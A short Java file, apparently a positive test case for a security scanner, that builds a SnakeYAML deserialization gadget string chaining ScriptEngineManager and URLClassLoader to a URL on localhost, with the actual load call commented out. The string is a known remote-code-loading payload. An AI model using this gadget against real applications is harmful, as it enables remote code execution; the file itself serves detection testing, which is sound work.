package sec.xtrfr.positive;

import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.Constructor;
import sec.xtrfr.Test1;

import java.io.ByteArrayInputStream;
import java.io.InputStream;

public class NewLoad {

    String vector = "some_var: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ " +
            "  !!java.net.URL [\"http://localhost:8000/abcdf.html\"]" +
            "     ]] ]";
    InputStream is = new ByteArrayInputStream(vector.getBytes());
    Yaml yaml = new Yaml(new Constructor(Test1.class));
//    Map<String, Object> obj = yaml.load(is);
}
